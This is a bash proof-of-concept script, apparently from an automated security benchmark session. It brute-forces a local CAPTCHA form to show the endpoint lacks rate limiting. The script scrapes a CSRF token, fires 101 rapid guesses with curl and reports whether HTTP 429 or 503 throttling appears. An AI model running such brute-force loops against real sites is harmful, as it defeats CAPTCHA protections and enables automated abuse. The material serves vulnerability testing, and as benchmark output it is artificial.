#!/bin/bash
# POC: POC demonstrating CAPTCHA validation endpoint lacks rate limiting, allowing unlimited rapid brute force attempts without 429/503 responses or artificial delays
# Target: ./repo
# Created: 2025-12-01T16:17:44.594Z
# Session: benchmark-XBEN-101-24-mincf28a

# CAPTCHA Brute Force Rate Limiting POC - Version 2
# Demonstrates that the CAPTCHA validation endpoint accepts unlimited rapid requests
# without implementing rate limiting, exponential backoff, or throttling

TARGET_URL="http://localhost:8000/"
ATTEMPT_COUNT=0
RATE_LIMIT_TRIGGERED=0
MIN_RESPONSE_TIME=999
MAX_RESPONSE_TIME=0

echo "=========================================="
echo "CAPTCHA Brute Force Rate Limiting POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Attempting rapid CAPTCHA validation requests..."
echo ""

# First, get initial session and CAPTCHA
echo "[*] Step 1: Getting initial session and CAPTCHA challenge"
INITIAL_RESPONSE=$(curl -s -c /tmp/cookies.txt "$TARGET_URL")

# Extract CSRF token from the HTML using better regex
CSRF_TOKEN=$(echo "$INITIAL_RESPONSE" | grep -oP 'name="csrf_token"[^>]*value="\K[^"]+' | head -1)

if [ -z "$CSRF_TOKEN" ]; then
    echo "[-] Failed to extract CSRF token"
    exit 1
fi

echo "[+] CSRF Token extracted: ${CSRF_TOKEN:0:20}..."
echo ""

# Now attempt rapid brute force validation with different CAPTCHA answers
echo "[*] Step 2: Attempting rapid CAPTCHA validation brute force (101 attempts)"
echo ""

for i in {0..100}; do
    START_TIME=$(date +%s%N)
    
    # Submit incorrect CAPTCHA answer (using random number)
    RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt -c /tmp/cookies.txt \
        -d "csrf_token=$CSRF_TOKEN&captcha=$i&username=testuser$i" \
        "$TARGET_URL" 2>/dev/null)
    
    END_TIME=$(date +%s%N)
    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    RESPONSE_TIME=$(( (END_TIME - START_TIME) / 1000000 ))  # Convert to milliseconds
    
    # Track timing
    if [ $RESPONSE_TIME -lt $MIN_RESPONSE_TIME ]; then
        MIN_RESPONSE_TIME=$RESPONSE_TIME
    fi
    if [ $RESPONSE_TIME -gt $MAX_RESPONSE_TIME ]; then
        MAX_RESPONSE_TIME=$RESPONSE_TIME
    fi
    
    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
    
    # Check for rate limiting indicators
    if [ "$HTTP_CODE" = "429" ]; then
        RATE_LIMIT_TRIGGERED=1
        echo "[!] Rate limit triggered at attempt $i (HTTP 429)"
        break
    elif [ "$HTTP_CODE" = "503" ]; then
        RATE_LIMIT_TRIGGERED=1
        echo "[!] Service unavailable at attempt $i (HTTP 503)"
        break
    fi
    
    # Print progress every 10 attempts
    if [ $((i % 10)) -eq 0 ] && [ $i -gt 0 ]; then
        echo "[*] Completed $i attempts - HTTP $HTTP_CODE - Response time: ${RESPONSE_TIME}ms"
    fi
done

echo ""
echo "=========================================="
echo "POC Results"
echo "=========================================="
echo "Total Attempts Completed: $ATTEMPT_COUNT"
echo "Rate Limiting Triggered: $([ $RATE_LIMIT_TRIGGERED -eq 1 ] && echo 'YES' || echo 'NO')"
echo "Min Response Time: ${MIN_RESPONSE_TIME}ms"
echo "Max Response Time: ${MAX_RESPONSE_TIME}ms"
echo ""

if [ $RATE_LIMIT_TRIGGERED -eq 0 ]; then
    echo "[+] VULNERABILITY CONFIRMED: No rate limiting detected"
    echo "    - All $ATTEMPT_COUNT requests were accepted"
    echo "    - No 429 Too Many Requests responses"
    echo "    - No 503 Service Unavailable responses"
    echo "    - Response times consistent (~${MIN_RESPONSE_TIME}-${MAX_RESPONSE_TIME}ms)"
    echo "    - Attacker can brute force CAPTCHA answers without throttling"
    exit 0
else
    echo "[-] Rate limiting appears to be present"
    exit 1
fi